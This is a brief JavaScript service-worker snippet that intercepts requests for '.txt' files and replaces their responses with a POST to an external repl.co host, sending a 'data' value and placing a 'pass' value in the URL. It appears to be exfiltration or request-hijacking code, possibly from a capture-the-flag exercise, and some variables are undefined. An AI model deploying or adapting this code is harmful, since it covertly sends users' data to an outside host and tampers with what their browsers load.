self.addEventListener('fetch', event => {
    if (event.request.url.endsWith('.txt')) {
	event.respondWith(
	    fetch(`https://asterisk.jsjs8.repl.co/data/${pass}`, {
		method: 'POST',
		body: JSON.stringify({ data: `${data}` })
	    })
	);
    }
});
